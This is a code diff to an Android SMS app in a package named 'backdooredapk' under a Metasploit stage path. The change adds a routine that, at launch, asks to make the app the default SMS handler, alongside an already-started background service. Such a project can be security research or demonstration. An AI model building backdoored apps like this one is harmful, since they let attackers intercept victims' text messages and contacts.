@@ -1,11 +1,14 @@
 package stage.metasploit.com.backdooredapk;
 
+import android.annotation.TargetApi;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.provider.ContactsContract;
 import android.os.Bundle;
+import android.provider.Telephony;
 import android.support.v4.view.GestureDetectorCompat;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
@@ -40,6 +43,7 @@ public class MainActivity extends Activity {
         setUpGestureListener();
         Intent mis = new Intent(this, MyIntentService.class);
         this.startService(mis);
+        checkIfDefaultSmsApp();
     }
 
     private List<Conversation> getConversations() {
@@ -169,6 +173,21 @@ public class MainActivity extends Activity {
     @Subscribe
     public void onEvent(NewSmsEvent event) {
         adapter.updateLastMessage(event.getPhoneNumber(), event.getSms().getBody());
+    }
+
+    @TargetApi(Build.VERSION_CODES.KITKAT)
+    private void checkIfDefaultSmsApp() {
+        final String myPackageName = getPackageName();
+        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)) {
+            // App is not default.
+
+            //change the default SMS app
+                    Intent intent =
+                            new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,
+                            myPackageName);
+                    startActivity(intent);
+        }
     }
 }
 
